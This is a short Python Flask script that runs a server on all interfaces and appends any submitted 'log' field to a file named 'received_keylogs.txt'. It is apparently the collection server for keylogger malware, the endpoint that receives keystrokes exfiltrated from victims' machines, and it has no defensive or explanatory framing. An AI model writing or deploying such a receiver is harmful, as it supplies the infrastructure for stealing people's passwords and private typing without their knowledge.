from flask import Flask, request

app = Flask(__name__)

@app.route('/receive_log', methods=['POST'])
def receive_log():
    log = request.form.get('log')
    if log:
        with open("received_keylogs.txt", "a") as file:
            file.write(log + "\n")
    return "Log received", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
